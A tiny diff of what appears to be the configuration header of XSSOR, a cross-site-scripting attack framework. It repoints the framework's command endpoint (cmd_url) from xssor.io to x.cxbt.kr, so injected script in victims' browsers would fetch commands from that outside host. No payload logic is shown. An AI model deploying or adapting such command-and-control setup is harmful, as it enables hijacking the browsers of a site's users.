@@ -1,6 +1,6 @@
-/*xssor.io*/
+/*x.cxbt.kr*/
 xssor = {};
-xssor.cmd_url = location.protocol + '//xssor.io/cmd';
+xssor.cmd_url = location.protocol + '//x.cxbt.kr/cmd';
 xssor.gone = 0;
 xssor.done = 0;
 
